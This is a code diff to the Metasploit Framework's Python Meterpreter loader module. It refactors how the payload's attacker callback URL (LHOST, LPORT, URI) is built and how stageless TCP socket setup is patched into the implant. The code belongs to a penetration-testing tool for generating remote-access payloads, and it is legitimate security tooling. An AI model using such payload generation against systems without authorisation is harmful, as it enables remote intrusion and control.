@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/core/payload/uuid/options'
 
@@ -16,6 +17,7 @@ module Payload::Python::MeterpreterLoader
 
   include Msf::Payload::Python
   include Msf::Payload::UUID::Options
+  include Msf::Payload::TransportConfig
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -106,17 +108,12 @@ module Payload::Python::MeterpreterLoader
     # so we need to generate it
     # TODO: move this to somewhere more common so that it can be used across payload types
     unless opts[:url].to_s == ''
+
+      # Build the callback URL (TODO: share this logic with TransportConfig
       uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
-      callback_url = [
-        opts[:url].to_s.split(':')[0],
-        '://',
-        (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLHOST'] : ds['LHOST']).to_s,
-        ':',
-        (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLPORT'] : ds['LPORT']).to_s,
-        ds['LURI'].to_s,
-        uri,
-        '/'
-      ].join('')
+      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
+      scheme, lhost, lport = transport_uri_components(opts)
+      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
 
       # patch in the various payload related configuration
       met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
@@ -133,11 +130,13 @@ module Payload::Python::MeterpreterLoader
 
     # patch in any optional stageless tcp socket setup
     unless opts[:stageless_tcp_socket_setup].nil?
+      offset_string = ""
+      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
       socket_setup = opts[:stageless_tcp_socket_setup]
       socket_setup = socket_setup.split("\n")
-      socket_setup.map! {|line| "\t\t#{line}\n"}
+      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
       socket_setup = socket_setup.join
-      met.sub!("\t\t# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
+      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
     end
 
     met
